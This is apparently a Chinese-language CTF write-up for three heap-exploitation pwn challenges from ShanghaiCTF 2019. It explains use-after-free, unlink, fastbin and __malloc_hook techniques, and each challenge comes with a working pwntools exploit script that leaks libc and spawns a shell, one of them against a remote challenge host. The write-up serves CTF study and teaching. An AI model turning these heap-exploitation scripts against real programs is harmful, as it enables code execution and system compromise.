---
title: ShanghaiCTF
date: 2019-11-03
categories: 
- competition
tags: heap __malloc_arena
---

# pwn的writeup

三道题全是堆TvT

## slient_note

有关`unsorted bin`的切割。  

这里他只有两个指针，一个指向大堆，一个指向小堆，`free`之后指针没有置空。利用切割的特性可以让两个堆有`overlap`，而且题目十分友好没有开`PIE`TvT，那么就可以来一发`unlink`。  

先`free`大的，再分配小的，就可以让大堆溢出到小堆构造`unlink`。  

把`free@got`的内容写成`puts@plt`就可以泄露`libc`基址。但是这一道题没有给`libc`文件，我当时没做出来，所以还没有去钻研怎么搞。但是其他两道题给了，根据CTF的尿性，应该可以用另外两道题的TvT。

但是这里需要注意的一个地方是记得在`top chunk`之前做分割！！！

### exp

```python
from pwn import *
import sys

context.log_level = 'debug'

elf = ELF('./pwn')
sh = process('./pwn')
libc = elf.libc

def add(tag,content):
    sh.sendlineafter('Exit\n','1')
    sh.sendlineafter('Large\n',str(tag))
    sh.sendlineafter('Content:\n',content)

def update(tag,content):
    sh.sendlineafter('Exit\n','3')
    sh.sendlineafter('Large\n',str(tag))
    sh.sendlineafter('Content:\n',content)

def delete(tag):
    sh.sendlineafter('Exit\n','2')
    sh.sendlineafter('Large\n',str(tag))

LARGE = 2
SMALL = 1

add(LARGE,'aaaa')
add(SMALL,'gggg')

delete(LARGE)
add(SMALL,'bbbb')
add(SMALL,'cccc')

ptr = 0x06020D8
payload = p64(0) + p64(0x21) + p64(ptr - 0x18) + p64(ptr - 0x10) + p64(0x20) + p64(0x210)
pause()
update(LARGE,payload)
delete(SMALL)

free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload = p64(0) + p64(0) + p64(puts_got) + p64(free_got)
update(LARGE,payload)
update(LARGE,p64(puts_plt))
delete(SMALL)

puts_addr = u64(sh.recv(6) + '\x00\x00')
libc_addr = puts_addr - libc.symbols['puts']
system_addr = libc_addr + libc.symbols['system']
log.info('---------->puts_addr:{:#x}'.format(puts_addr))
log.info('---------->system_addr:{:#x}'.format(system_addr))

update(LARGE,p64(system_addr))
add(SMALL,'/bin/sh\x00')
delete(SMALL)

sh.interactive()
sh.close()
```

## login

有关爆破的一个题。  

这题也是UAF，`free`之后指针没有置空。注册一个密码长度`0x18`的用户，删除之后再注册一个密码长度`0x18`的用户，就可以实现用户堆和密码堆之间互写。  

用户堆的第一项是密码堆的地址，第二项是一个函数地址，在`login`成功的时候会调用这个函数，并且用第一项作为参数传入。现在这个两个地址都是可写的。难点在怎么把地址弄出来。  

这个地方需要密码堆的内容和你输入的内容相等才能够调用，一开始一直想不出来，但是感谢一位同学提供的思路。  

比如这里我们要爆破`free`的地址，但我们不必往第一项里写`free@got`，可以先写`free@got + 5`，由于地址的最低位是`\x00\x00`,所以我们只需要输入`\x7f`就可以调用第二项的函数。那么接下来输入+4+3……，就可以一位一位爆破出来。  

### exp

```python
from pwn import *
import sys

#context.log_level = 'debug'
context.terminal = ['deepin-terminal','-x','sh','-c']

elf = ELF('./login')

if sys.argv[1] == 'l':
    libc = elf.libc
    sh = process('./login')
else:
    libc = ELF('./libc-2.23.so')
    sh = remote('8sdafgh.gamectf.com',20000)

def register(id,length,pswd):
    sh.sendlineafter('Choice:\n',str(2))
    sh.sendlineafter('id:\n',str(id))
    sh.sendlineafter('length:\n',str(length))
    sh.sendafter('password:\n',str(pswd))

def login(id,length,pswd):
    sh.sendlineafter('Choice:\n',str(1))
    sh.sendlineafter('id:\n',str(id))
    sh.sendlineafter('length:\n',str(length))
    sh.sendafter('password:\n',str(pswd))

def delete(id):
    sh.sendlineafter('Choice:\n',str(3))
    sh.sendlineafter('id:\n',str(id))

def edit(id,pswd):
    sh.sendlineafter('Choice:\n',str(4))
    sh.sendlineafter('id:\n',str(id))
    sh.sendlineafter('pass:\n',str(pswd))


free_got = elf.got['free']
puts_got = elf.got['puts']

register(0,0x18,'aaaa')
delete(0)
register(1,0x18,p64(free_got))
ii = '\x7f'
for r in range(5):
    edit(1,p64(free_got+4-r))
    for i in range(0,0xff+1):
        login(0,0x18, chr(i) + ii)
        info = sh.recvuntil('\n')
        if info[0] == 'W':
            continue
        else:
            ii = chr(i) + ii
            log.info('{}'.format(ii))
            break
pause()
free_addr = u64(ii + '\x00\x00')
free_libc = libc.symbols['free']
libc_addr = free_addr - free_libc
system_addr = libc_addr + libc.symbols['system']
bin_sh = libc_addr + libc.search('/bin/sh').next()

edit(1,p64(bin_sh)+ p64(system_addr))
login(0,0x8,'/bin/sh')
sh.interactive()
sh.close()
```

## boring_heap

这个题一开始的漏洞我觉得就是没有，完美的一个程序（微笑.jpg），问了大佬才知道的。  

> 计算机用补码存储数据，也就是说负数比正数多一个，那么我们在`abs`这个最大的负数的时候是没有对应的正数的，所以返回的仍旧是这个负数。  
> 题目这个地方`abs`之后会取余他的`size`，只有`0x30`得出来不是0，根据C语言取余的特性会返回一个绝对值小于`0x30`的负数，也就是`-0x20`。  

先分配5个堆，`#0`用来当做溢出点，`#4` 用来分隔 `top chunk`。  
`edit` `#1` 可以将`#1`的size改成`0xd1`，这样在`free` `#1`的时候这个堆就会被放到`unsorted bin`里面。既可以泄露地址也可以overlap。  
overlap之后就可以进行`fastbin attack`。  

> `main_arena` 中使用 `malloc_state` 这个数据结构来管理整个分配区。  
>
```C
struct malloc_state {
/* Serialize access. */
mutex_t mutex;              //4bytes
/* Flags (formerly in max_fast). */
int flags;                  //4bytes
#if THREAD_STATS
/* Statistics for locking. Only used if THREAD_STATS is defined. */
long stat_lock_direct, stat_lock_loop, stat_lock_wait;
#endif
//每个指针占的字节都是8
/* Fastbins */
mfastbinptr fastbinsY[NFASTBINS];    //NFASTBINS等于10
/* Base of the topmost chunk -- not otherwise kept in a bin */
mchunkptr top;
/* The remainder from the most recent split of a small request */
mchunkptr last_remainder;
/* Normal bins packed as described above */
mchunkptr bins[NBINS * 2 - 2];      // NBINS 等于128
/* Bitmap of bins */
unsigned int binmap[BINMAPSIZE];
/* Linked list */
struct malloc_state *next;
#ifdef PER_THREAD
/* Linked list for free arenas. */
struct malloc_state *next_free;
#endif
/* Memory allocated from the system in this arena. */
INTERNAL_SIZE_T system_mem;
INTERNAL_SIZE_T max_system_mem;
};
```

> `__malloc_hook`:  
> 这个是一个函数指针，在每次malloc调用的时候就会先检查这个指针是否为空，为空则跳过，不为空则执行他。在初始化地址分配的时候，里面存储的是`malloc_hook_ini()`，在这个函数里面将`__malloc_hook` 置为NULL。  
> <a href = "http://www.luyixian.cn/news_show_187619.aspx"> 具体利用方式 </a>  

>bins里面都是双向链表。在最开始的时候，unsorted bin里面存放的是top chunk的地址。   

但是一般如果要让堆分配到`__malloc_hook`去的话，附近合适的size就是`__malloc_hook - 0x23`处的 `0x7f`,而这题规定死了他的size大小，所以不能让`fastbins`直接分配到`__malloc_hook`。  
这个题很厉害的地方就在于，可以让`fastbins`的某个指针内容直接为size大小，然后让堆分配到`fastbins`上面去，然后覆盖`malloc_state`里面的`top`指针到`__malloc_hook`附近。  

主要的利用姿势见exp。  

```python
#coding = utf-8

from pwn import *
from time import *

context.log_level  = 'debug'

elf = ELF('./pwn')
libc = elf.libc
sh = process('./pwn')

def add(choice, cont):
    sh.sendlineafter("Exit\n", "1")
    sh.sendlineafter("Large\n", str(choice))
    sh.sendafter("Content:\n", cont)
    sleep(0.01)

def edit(idx, where, cont):
    sh.sendlineafter("Exit\n", "2")
    sh.sendlineafter("update?\n", str(idx))
    sh.sendlineafter("update?\n", str(where))
    sh.sendafter("Content:\n", cont)
    sleep(0.01)

def delete(idx):
    sh.sendlineafter("Exit\n", "3")
    sh.sendlineafter("delete?\n", str(idx))


def show(idx):
    sh.sendlineafter("Exit\n", "4")
    sh.sendlineafter("view?\n", str(idx))

S = 1
M = 2
L = 3

libc.sym['main_arena'] = 0x3c4b20
libc.sym['one_gadget'] = 0xf1147
add(S,'0000' + '\n') #0
add(M,'1111' + '\n') #1
add(L,'2222' + '\n') #2
add(M,'3333' + '\n') #3
add(L,'4444' + '\n') #4


payload = p64(0) + p64(0) + p64(0) + p64(0xd1) + '\n'
edit(1,0x80000000,payload)
delete(1)

pause()
add(M,'5555555' + '\n') #5
show(5)

offset_unsorted_arena = 0x8 + 0x8 * 0xa 
'''
int32 mutex
int32 flag
int64 fastbin[10]
int64 top
int64 last_reminder
int64 unsorted bin
'''
#libc.address = u64(sh.recvuntil('\x7f')[-6:] + '\x00\x00')  - offset_unsorted_arena - libc.sym['main_arena']

libc.address = u64(sh.recvuntil('\x7f')[-6:] + '\x00\x00') - 0xc0 - offset_unsorted_arena - libc.sym['main_arena']
success('libc_addr : {:#x}'.format(libc.address))

add(L,'6666' + '\n') #6 overlap 2
add(M,'7777' + '\n') #7 overlap 3

delete(2)
delete(3)

payload = p64(libc.sym['main_arena'] + 0x10)
edit(6,0,payload + '\n')
edit(7,0,p64(0x51) + '\n')
add(L,'8888' + '\n')
add(M,'9999' + '\n')

payload = p64(0) * 7 + p64(libc.sym['__malloc_hook'] - 0x10)
add(L,payload )


payload = p64(libc.sym['one_gadget'])
add(S,payload + '\n')

sh.sendlineafter("Exit\n", "1")
sh.sendlineafter("Large\n", '1')

sh.interactive()
```

![malloc_state]("../assets/images/malloc_state.png")

### 疑惑

这里在计算libc的基址的时候，中间为啥要加一个`0xc0`我也不知道，动调的时候加了发现了。